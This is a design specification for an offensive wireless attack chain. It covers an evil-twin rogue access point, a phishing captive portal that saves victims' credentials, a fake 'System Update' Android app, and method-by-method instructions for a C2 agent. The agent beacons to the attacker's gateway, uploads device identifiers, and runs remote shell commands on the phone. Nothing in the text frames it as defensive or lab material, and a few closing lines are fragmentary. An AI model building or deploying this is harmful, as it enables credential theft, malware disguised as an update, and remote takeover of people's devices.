================================================================================
ARCHITECTURE OVERVIEW
================================================================================

The attack flow is:
  1. WEF Evil Twin creates a Rogue AP (hostapd + dnsmasq + lighttpd on :80)
  2. DNS redirect sends all victim traffic to the captive portal (PHP)
  3. Victim enters credentials on phishing page → post.php saves to file
     + shared creds.jsonl + modal popup appears
  4. Popup says "System Update Required" → victim downloads APK
  5. Victim installs "System Update" app → taps "START AGENT"
  6. C2 Agent auto-detects gateway IP via WiFi DHCP, beacons to :80/beacon.php
  7. beacon.php proxies POST to dashboard :4443 via curl
  8. Dashboard (Flask :4443) shows creds + agents + sends shell commands
  9. Command results flow back via :80/results.php → :4443/results

--- FILE: agent/build/C2Service.java (UNIVERSAL VERSION) ---
- Package: com.c2.agent
- Extends Service
- Static fields: TAG="C2Agent", C2_BEACON, C2_RESULTS (set dynamically),
  BEACON_INTERVAL=15, running=false
- ScheduledExecutorService scheduler

- **detectGateway() method:**
  - Get WifiManager from context
  - Get DhcpInfo, extract gateway IP as int
  - Convert int to dotted string: (ip&0xFF) + "." + ((ip>>8)&0xFF) + "." +
    ((ip>>16)&0xFF) + "." + ((ip>>24)&0xFF)
  - If gateway is "0.0.0.0" or detection fails, fallback to "10.0.2.2" (emulator)
  - If ConnectivityManager shows not WiFi, return null (will use fallback)

- **onCreate():**
  - Call detectGateway(), build C2_BEACON = "http://{gateway}:80/beacon.php"
  - Build C2_RESULTS = "http://{gateway}:80/results.php"
  - Set running=true
  - Log "C2 Gateway: {gateway} | Beacon: {C2_BEACON}"
  - Create SingleThreadScheduledExecutor, schedule beacon() at fixed rate:
    2s initial delay, 15s interval

- **onStartCommand():** return START_STICKY (auto-restart if killed)
- **onBind():** return null
- **onDestroy():** running=false, shutdown scheduler

- **beacon() method:**
  - Collect device info via collectDeviceInfo()
  - HTTP POST to C2_BEACON
  - Parse response: look for "shell:" strings between quotes (simple JSON parse)
  - For each command found (indexOf("shell:") loop), call executeCommand()

- **collectDeviceInfo() method:**
  - Build URL-encoded form string with fields:
    device=Build.DEVICE, model=Build.MODEL, brand=Build.BRAND,
    release=Build.VERSION.RELEASE, sdk=Build.VERSION.SDK_INT,
    id=Settings.Secure.ANDROID_ID,
    network=activeNetworkInfo.getTypeName() or "NONE",
    gateway=WiFi DHCP gateway IP
  - Return as form-encoded string

- **executeCommand(String cmd) method:**
  - If cmd starts with "shell:": call runShellCommand(cmd.substring(6))
  - Else: output = "Unknown: " + cmd
  - POST output to C2_RESULTS with form data: id=ANDROID_ID&output=encoded_output

- **runShellCommand(String cmd) method:**
  - Runtime.getRuntime().exec(cmd)
  - Read process stdout via BufferedReader
  - Wait for process, return trimmed output
  - On error: return "ERROR: " + e.getMessage()

- **httpPost(String urlStr, String data) method:**
  - HttpURLConnection, POST method, Content-Type: application/x-www-form-urlencoded
  - 8 second connect/read timeout
  - Write data bytes (UTF-8), read response, return as string

- **urlEncode(String s) method:**
  - URLEncoder.encode(s, "UTF-8") with fallback to raw string

- If no result: return '{"commands":[],"interval":30}'

- Uses shell_exec with `>/dev/null 2>&1 &` (fire-and-forget)
- Returns "OK"
